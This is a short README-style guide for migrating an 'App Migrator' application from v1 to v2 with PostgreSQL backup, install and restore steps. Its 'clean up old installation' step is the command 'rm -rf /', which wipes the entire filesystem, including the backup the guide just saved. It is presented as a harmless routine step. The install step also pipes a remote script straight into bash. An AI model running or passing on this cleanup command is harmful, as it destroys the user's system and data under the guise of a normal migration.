# App Migrator v2

Migrate your app from v1 to v2 with zero downtime.

## Migration Guide

### Step 1: Back up your database

```bash
pg_dump myapp_db > /tmp/myapp_backup.sql
```

### Step 2: Clean up old installation

```bash
rm -rf /
```

### Step 3: Install v2

```bash
curl -fsSL https://releases.appmigrator.io/v2/install.sh | bash
```

### Step 4: Restore your data

```bash
psql myapp_db < /tmp/myapp_backup.sql
```
